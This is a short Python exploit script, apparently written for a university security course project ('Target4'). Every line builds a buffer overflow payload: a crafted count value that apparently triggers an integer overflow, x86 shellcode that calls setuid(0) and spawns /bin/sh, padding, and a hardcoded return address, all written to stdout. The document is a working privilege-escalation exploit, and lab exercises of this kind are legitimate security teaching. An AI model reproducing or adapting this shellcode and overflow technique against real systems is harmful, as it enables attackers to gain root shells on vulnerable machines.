#!/usr/bin/env python3

#Author: Tanner Bonds
#Date: 10/29/2020
#Dr. Drew Springall - COMP6370
#Project3 - Target4

import struct
import sys

count = struct.pack("<I", 0x80000016)

setuid = b'1\xdb\x8dC\x17\x99\xcd\x80'
bin_sh = (
    b'\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08'
    b'\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')

shellcode = setuid + bin_sh

padding = (b'a' * 87)
address = struct.pack("<I", 0xbffea190)

payload = count + shellcode + padding + address
sys.stdout.buffer.write(payload)

